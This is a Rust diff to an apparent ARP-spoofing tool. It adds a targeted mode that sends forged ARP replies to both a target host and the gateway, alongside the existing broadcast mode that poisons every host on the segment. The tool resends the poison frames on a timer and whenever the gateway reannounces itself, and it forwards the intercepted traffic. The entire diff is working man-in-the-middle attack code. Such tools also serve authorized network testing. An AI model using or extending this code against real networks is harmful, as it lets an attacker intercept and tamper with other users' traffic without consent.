@@ -117,10 +117,6 @@ pub(super) async fn run(
         None => None,
     };
 
-    // Without an explicit target, poison every host on the segment using a
-    // gratuitous-style frame (sender IP == target IP == gateway)
-    let target: Host = target.unwrap_or(gateway);
-
     let result: io::Result<()> = tokio::select! {
         result = spoof_loop(&tx, &mut rx, &mut table, our_mac, gateway, target, rate, burst, &mut dump) => {
             result
@@ -135,6 +131,78 @@ pub(super) async fn run(
     result
 }
 
+fn make_poison_frames(our_mac: MacAddr, gateway: Host, target: Option<Host>) -> Vec<Bytes> {
+    // Poison frames, sent on the initial burst and on every tick.
+    let mut poisons: Vec<Bytes> = Vec::new();
+
+    match target {
+        Some(target) => {
+            // Targeted mode, unicast poison to both directions.
+
+            // Target: the gateway is at our MAC
+            let to_target = DataLinkFrame {
+                eth_dst: target.mac,
+                eth_src: our_mac,
+                payload: ArpPacket {
+                    opcode: ArpOpCode::Reply,
+                    sender_mac: our_mac,
+                    sender_ip: gateway.ip,
+                    target_mac: target.mac,
+                    target_ip: target.ip,
+                },
+            };
+
+            // Gateway: the target is at our MAC
+            let to_gateway = DataLinkFrame {
+                eth_dst: gateway.mac,
+                eth_src: our_mac,
+                payload: ArpPacket {
+                    opcode: ArpOpCode::Reply,
+                    sender_mac: our_mac,
+                    sender_ip: target.ip,
+                    target_mac: gateway.mac,
+                    target_ip: gateway.ip,
+                },
+            };
+
+            poisons.push(to_target.encode());
+            poisons.push(to_gateway.encode());
+        }
+        None => {
+            // Without an explicit target, poison every host on the segment
+            // using a gratuitous-style frame (sender IP == target IP == gateway)
+            let reply = DataLinkFrame {
+                eth_dst: MacAddr::BROADCAST,
+                eth_src: our_mac,
+                payload: ArpPacket {
+                    opcode: ArpOpCode::Reply,
+                    sender_mac: our_mac,
+                    sender_ip: gateway.ip,
+                    target_mac: MacAddr::BROADCAST,
+                    target_ip: gateway.ip,
+                },
+            };
+
+            poisons.push(reply.encode());
+        }
+    }
+
+    poisons
+}
+
+async fn send_poisons(
+    tx: &DataLinkSender,
+    poisons: &[Bytes],
+    dump: &mut Option<PcapWriter>,
+) -> io::Result<()> {
+    for poison in poisons {
+        tx.send(poison).await?;
+        dump_frame(dump, poison).await;
+    }
+
+    Ok(())
+}
+
 #[allow(clippy::too_many_arguments)]
 async fn spoof_loop(
     tx: &DataLinkSender,
@@ -142,24 +210,12 @@ async fn spoof_loop(
     table: &mut HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
     gateway: Host,
-    target: Host,
+    target: Option<Host>,
     rate: Duration,
     burst: usize,
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
-    let reply = DataLinkFrame {
-        eth_dst: MacAddr::BROADCAST,
-        eth_src: our_mac,
-        payload: ArpPacket {
-            opcode: ArpOpCode::Reply,
-            sender_mac: our_mac,
-            sender_ip: gateway.ip,
-            target_mac: MacAddr::BROADCAST,
-            target_ip: target.ip,
-        },
-    };
-
-    let reply: Bytes = reply.encode();
+    let poisons: Vec<Bytes> = make_poison_frames(our_mac, gateway, target);
 
     // Initial burst to poison the caches as fast as possible
     for i in 0..burst {
@@ -167,8 +223,7 @@ async fn spoof_loop(
             time::sleep(BURST_INTERVAL).await;
         }
 
-        tx.send(&reply).await?;
-        dump_frame(dump, &reply).await;
+        send_poisons(tx, &poisons, dump).await?;
     }
 
     let mut tick = time::interval(rate);
@@ -176,11 +231,10 @@ async fn spoof_loop(
     loop {
         tokio::select! {
             _ = tick.tick() => {
-                tx.send(&reply).await?;
-                dump_frame(dump, &reply).await;
+                send_poisons(tx, &poisons, dump).await?;
             },
             frame = rx.next() => {
-                if let Err(e) = handle_frame(frame?, table, our_mac, gateway, tx, &reply, dump).await {
+                if let Err(e) = handle_frame(frame?, table, our_mac, gateway, target, tx, &poisons, dump).await {
                     eprintln!("Error handling frame: {e}");
                 }
             }
@@ -194,12 +248,16 @@ async fn handle_frame(
     table: &mut HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
     gateway: Host,
+    target: Option<Host>,
     tx: &DataLinkSender,
-    reply: &[u8],
+    poisons: &[Bytes],
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
     if let Ok(arp) = ArpFrame::decode(&frame) {
-        return handle_arp(&arp, &frame, table, our_mac, gateway, tx, reply, dump).await;
+        return handle_arp(
+            &arp, &frame, table, our_mac, gateway, target, tx, poisons, dump,
+        )
+        .await;
     };
 
     handle_ipv4_packet_forward(frame, table, tx, gateway, our_mac, dump).await
@@ -212,8 +270,9 @@ async fn handle_arp(
     table: &mut HashMap<Ipv4Addr, MacAddr>,
     our_mac: MacAddr,
     gateway: Host,
+    target: Option<Host>,
     tx: &DataLinkSender,
-    reply: &[u8],
+    poisons: &[Bytes],
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
     // Discard our own packets
@@ -227,8 +286,9 @@ async fn handle_arp(
     if arp.is_gratuitous() && arp.sender_ip == gateway.ip {
         println!("Gateway reannounced an IP that we impersonate, spoofing again");
         dump_frame(dump, frame).await;
-        tx.send(reply).await?;
-        dump_frame(dump, reply).await;
+
+        send_poisons(tx, poisons, dump).await?;
+
         return Ok(());
     }
 
@@ -244,8 +304,12 @@ async fn handle_arp(
             println!("ARP request received");
 
             // Someone is looking for the gateway: answer immediately,
-            // so its cache gets poisoned before the gateway can reply
-            if arp.target_ip == gateway.ip {
+            // so its cache gets poisoned before the gateway can reply.
+            // In targeted mode, only answer to the target, so no other
+            // host's cache gets poisoned.
+            let is_target: bool = target.is_none_or(|t| arp.eth_src == t.mac);
+
+            if arp.target_ip == gateway.ip && is_target {
                 dump_frame(dump, frame).await;
 
                 let response = DataLinkFrame {
